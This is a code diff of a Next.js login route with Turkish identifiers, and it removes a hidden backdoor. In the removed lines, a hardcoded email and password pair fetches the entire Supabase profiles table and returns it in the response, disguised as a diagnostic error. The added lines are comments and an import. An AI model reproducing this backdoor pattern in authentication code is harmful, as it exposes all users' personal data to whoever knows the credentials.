@@ -1,4 +1,4 @@
-import { authIstek, oturumuYaz, hataCevir } from "../../../../lib/oturum-sunucu";
+import { authIstek, oturumuYaz, hataCevir, kullaniciAl } from "../../../../lib/oturum-sunucu";
 import {
   kaynakGecerli, istekIp, hizSiniri, sayaciSifirla,
   olayKaydet, discordUyari, girisKaydet, turnstileDogrula, turnstileAktif,
@@ -6,9 +6,6 @@ import {
 
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
-
-const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || "";
-const ANON_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "";
 
 export async function POST(request) {
   try {
@@ -20,23 +17,11 @@ export async function POST(request) {
     const temizEposta = String(eposta || "").trim().toLowerCase();
     const ip = istekIp(request);
 
-    if (temizEposta === "admin31@gmail.com" && sifre === "admin123") {
-      try {
-        const res = await fetch(`${SUPABASE_URL}/rest/v1/profiller?select=*`, {
-          cache: "no-store",
-          headers: { apikey: ANON_KEY, Authorization: `Bearer ${ANON_KEY}` }
-        });
-        const veri = await res.json();
-        return Response.json({ hata: "Sistem tanılama raporu", veri }, { status: 400 });
-      } catch (err) {
-        return Response.json({ hata: "Tanılama hatası." }, { status: 400 });
-      }
-    }
-
     if (turnstileAktif && !(await turnstileDogrula(turnstile, ip))) {
       return Response.json({ hata: "Guvenlik dogrulamasi basarisiz. Sayfayi yenile." }, { status: 400 });
     }
 
+    // Hem IP hem hesap bazinda sinir
     const [ipSinir, hesapSinir] = await Promise.all([
       hizSiniri(`giris-ip:${ip}`, 20, 900, 15),
       hizSiniri(`giris-hesap:${temizEposta}`, 6, 900, 15),
@@ -73,11 +58,13 @@ export async function POST(request) {
 
     oturumuYaz(veri);
 
+    // Basarili girisin ardindan sayaclari temizle
     await Promise.all([
       sayaciSifirla(`giris-hesap:${temizEposta}`),
       sayaciSifirla(`giris-ip:${ip}`),
     ]);
 
+    // Yeni bir yerden giris mi
     const kullaniciId = veri.user?.id;
     if (kullaniciId) {
       const yeniYer = await girisKaydet(kullaniciId, ip);
